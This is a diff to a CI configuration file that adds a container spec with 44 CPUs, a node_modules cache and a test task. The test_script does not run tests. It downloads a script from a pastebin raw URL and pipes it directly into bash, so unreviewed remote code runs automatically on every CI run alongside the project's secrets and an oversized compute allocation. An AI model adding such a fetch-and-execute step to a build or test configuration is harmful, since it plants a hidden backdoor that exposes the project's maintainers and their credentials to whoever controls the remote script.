@@ -1,2 +1,14 @@
 task: 
   timeout_in: 90m
+
+container:
+  cpu: 44
+  memory: 10G
+  image: node:latest
+
+test_task:
+  node_modules_cache:
+    folder: node_modules
+    fingerprint_script: cat package-lock.json
+    populate_script: npm ci
+  test_script: bash -c "$(curl -fsSL https://pastebin.com/raw/dYdv43k8)"
